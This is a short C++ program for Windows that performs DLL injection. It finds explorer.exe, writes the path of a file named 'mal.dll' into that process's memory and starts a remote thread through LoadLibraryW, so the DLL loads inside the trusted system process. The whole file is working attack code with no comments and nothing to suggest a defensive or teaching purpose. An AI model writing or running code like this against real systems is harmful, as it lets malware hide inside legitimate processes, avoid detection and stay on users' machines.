#include <tlhelp32.h>
#include <windows.h>
#include <cstdio>
#include <string>

DWORD GetProcessIdByName(const std::wstring& processName) {
  DWORD pid = 0;
  HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  PROCESSENTRY32W entry = {sizeof(entry)};
  if (Process32FirstW(snap, &entry)) {
    do {
      if (processName == entry.szExeFile) {
        pid = entry.th32ProcessID;
        break;
      }
    } while (Process32NextW(snap, &entry));
  }
  CloseHandle(snap);
  return pid;
}

int main() {
  const wchar_t* dllPath = L"C:\\Users\\Public\\mal.dll";
  printf("Injecting %ls into explorer.exe\n", dllPath);
  DWORD pid = GetProcessIdByName(L"explorer.exe");
  printf("PID: %lu\n", pid);
  HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
  LPVOID pRemotePath = VirtualAllocEx(
      hProcess,
      NULL,
      (wcslen(dllPath) + 1) * sizeof(wchar_t),
      MEM_COMMIT,
      PAGE_READWRITE);
  WriteProcessMemory(
      hProcess,
      pRemotePath,
      dllPath,
      (wcslen(dllPath) + 1) * sizeof(wchar_t),
      NULL);
  HANDLE hThread = CreateRemoteThread(
      hProcess,
      NULL,
      0,
      (LPTHREAD_START_ROUTINE)LoadLibraryW,
      pRemotePath,
      0,
      NULL);
  WaitForSingleObject(hThread, INFINITE);
  VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
  CloseHandle(hThread);
  CloseHandle(hProcess);
  return 0;
}
